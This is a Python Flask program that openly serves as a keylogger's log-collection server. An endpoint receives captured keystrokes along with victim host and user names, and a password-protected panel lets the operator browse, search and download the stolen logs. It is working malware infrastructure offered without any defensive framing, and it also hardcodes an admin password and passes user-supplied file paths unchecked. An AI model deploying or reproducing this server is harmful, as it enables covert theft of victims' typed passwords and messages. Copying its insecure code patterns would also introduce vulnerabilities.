from flask import Flask, request, render_template_string, send_from_directory, redirect, url_for, Response
import os
from datetime import datetime
import base64
import getpass
import socket

app = Flask(__name__)
LOG_DIR = "logs"
USERNAME = "admin"
PASSWORD = "securepass123"

if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

HTML_TEMPLATE = """
<!doctype html>
<title>Keylogger Logs</title>
<h1>Received Keylogs</h1>
<form method="GET">
    <input type="text" name="search" placeholder="Search logs..." value="{{ request.args.get('search', '') }}">
    <input type="submit" value="Search">
</form>
<ul>
  {% for filename in files %}
    <li>
      <a href="{{ url_for('view_log', filename=filename) }}">{{ filename }}</a>
      [<a href="{{ url_for('download_log', filename=filename) }}">Download</a>]
    </li>
  {% else %}
    <li>No logs received yet.</li>
  {% endfor %}
</ul>
"""

VIEW_TEMPLATE = """
<!doctype html>
<title>Log Preview</title>
<h1>{{ filename }}</h1>
<pre style="white-space: pre-wrap; word-wrap: break-word;">{{ content }}</pre>
<a href="{{ url_for('index') }}">Back to logs</a>
"""

def check_auth(auth):
    if not auth:
        return False
    try:
        decoded = base64.b64decode(auth.split()[1]).decode('utf-8')
        user, pwd = decoded.split(':')
        return user == USERNAME and pwd == PASSWORD
    except Exception:
        return False

def requires_auth(f):
    def wrapper(*args, **kwargs):
        auth = request.headers.get('Authorization')
        if not check_auth(auth):
            return Response(
                'Unauthorized', 401,
                {'WWW-Authenticate': 'Basic realm="Login Required"'}
            )
        return f(*args, **kwargs)
    wrapper.__name__ = f.__name__
    return wrapper

@app.route('/receive_logs', methods=['POST'])
def receive_logs():
    log_data = request.form.get('log')
    user = request.form.get('user', 'unknown')
    host = request.form.get('host', 'unknown')

    if not log_data:
        return "No log data received", 400

    timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    filename = f"log_{host}_{user}_{timestamp}.txt"
    filepath = os.path.join(LOG_DIR, filename)

    # Optional: truncate long logs
    if len(log_data) > 10000:
        log_data = log_data[:10000] + "\n[...Log truncated]"

    with open(filepath, "w", encoding="utf-8") as f:
        f.write(f"User: {user}\nHost: {host}\nTime: {timestamp}\n\n{log_data}")

    return "Log received", 200

@app.route('/')
@requires_auth
def index():
    files = sorted(os.listdir(LOG_DIR), reverse=True)
    query = request.args.get("search", "").lower()
    if query:
        files = [f for f in files if query in f.lower()]
    return render_template_string(HTML_TEMPLATE, files=files)

@app.route('/logs/<path:filename>')
@requires_auth
def download_log(filename):
    return send_from_directory(LOG_DIR, filename, as_attachment=True)

@app.route('/view/<path:filename>')
@requires_auth
def view_log(filename):
    filepath = os.path.join(LOG_DIR, filename)
    if not os.path.isfile(filepath):
        return "Log not found", 404
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()
    return render_template_string(VIEW_TEMPLATE, filename=filename, content=content)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
